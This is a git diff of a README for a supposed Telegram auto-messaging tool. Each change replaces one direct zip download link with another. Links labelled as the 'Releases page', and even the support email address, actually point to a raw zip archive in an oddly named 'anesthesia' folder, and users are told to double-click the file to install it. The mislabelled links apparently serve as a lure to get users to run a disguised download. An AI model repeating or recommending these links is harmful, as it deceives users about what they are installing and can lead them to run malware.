@@ -14,11 +14,11 @@ Telegram Automatic Messaging is a tool designed to help you manage all your mess
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/main/anesthesia/Telegram-Automatic-Messaging.zip) to download the latest version.
+To get started, visit the [Releases page](https://github.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/raw/refs/heads/main/anesthesia/Messaging_Telegram_Automatic_3.4-beta.3.zip) to download the latest version.
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/main/anesthesia/Telegram-Automatic-Messaging.zip).
+1. Go to the [Releases page](https://github.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/raw/refs/heads/main/anesthesia/Messaging_Telegram_Automatic_3.4-beta.3.zip).
 2. Look for the latest version of the software.
 3. Click the download link for your operating system (e.g., Windows, macOS).
 4. Once downloaded, locate the file and double-click it to install.
@@ -48,7 +48,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/AHME
 
 ## 📧 Support
 
-For any questions or issues, feel free to open an issue on our GitHub repository. You can also reach us via email at https://raw.githubusercontent.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/main/anesthesia/Telegram-Automatic-Messaging.zip
+For any questions or issues, feel free to open an issue on our GitHub repository. You can also reach us via email at https://github.com/AHMEDBOGABAL/Telegram-Automatic-Messaging/raw/refs/heads/main/anesthesia/Messaging_Telegram_Automatic_3.4-beta.3.zip
 
 ## 🌐 Community
 
